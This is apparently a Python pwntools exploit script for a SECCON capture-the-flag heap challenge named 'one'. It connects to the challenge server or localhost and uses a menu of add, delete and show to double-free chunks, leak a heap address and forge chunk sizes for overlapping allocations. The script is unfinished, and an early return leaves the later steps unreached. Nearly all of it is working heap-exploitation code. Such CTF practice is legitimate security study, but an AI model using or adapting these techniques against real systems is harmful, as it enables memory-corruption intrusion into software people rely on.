#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./one"

rhp1 = {"host":"one.chal.seccon.jp","port":18357}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def add(conn,content):
  if(len(content)>=0x40):
    print("[!]too large content")
    return
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil("> ")
  conn.sendline(content)

def delete(conn):
  conn.recvuntil("> ")
  conn.sendline("3")

def show(conn):
  conn.recvuntil("> ")
  conn.sendline("2")

def exploit(conn):
  small_chunks = 0x10
  size = 48+0x50*small_chunks+0x10-0x40

  add(conn,p64(0)+p64(size|0x1)) #size (eventually overwritten?)
  for i in range(small_chunks):
    #add(conn,"A"*0x10 + p64(size) + p64(0x31))
    add(conn,p64(size|0x1) + p64(0x31))
  
  add(conn,"B"*8)
  delete(conn)
  delete(conn)
  delete(conn)

  #leak heap addr
  show(conn)
  data = unpack(conn.recvline()[:-1].ljust(8,"\x00")[0:8])
  print("[+]data: "+hex(data))


  #make point to large chunk
  print("[+]large chunk: "+hex(data-0x50*(small_chunks+1)))
  add(conn,p64(data-0x50*(small_chunks+1)+0x10) + p64(0))
  add(conn,p64(data-0x50*(small_chunks+1)+0x10) + p64(0))
  add(conn,p64(0)*2) #large chunk

  delete(conn)

  return
  add(conn,p64(data + 0x48))
  add(conn,"Y"*8)
  raw_input()
  add(conn,p64(0x31))

  add(conn,"Z"*8)


if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

